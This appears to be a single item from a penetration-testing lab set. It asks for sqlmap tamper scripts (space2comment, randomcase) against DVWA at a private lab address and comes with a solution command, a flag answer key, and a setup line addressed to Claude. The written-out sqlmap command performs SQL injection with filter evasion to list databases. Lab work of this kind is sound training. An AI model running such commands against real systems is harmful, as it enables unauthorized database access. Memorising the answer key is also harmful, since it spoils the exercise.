# Q262 — SQLMap Tamper Scripts for WAF Bypass

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🔴 Hard |
| **Tools** | `sqlmap` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use sqlmap tamper scripts to bypass basic input filters. Try --tamper=space2comment,randomcase. List available tamper scripts."

---

## 🎯 Flag Format

```
tamper_used=<script_names>; bypass=<yes|no>
```

---

## ✅ Solution

```bash
sqlmap --list-tampers
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=medium" --tamper=space2comment,randomcase --dbs --batch
```

**Answer:** `tamper_used=space2comment,randomcase; bypass=yes`

---

## 🤖 Claude Setup Prompt

Set DVWA security to medium. Report back: "Lab ready for Q262"
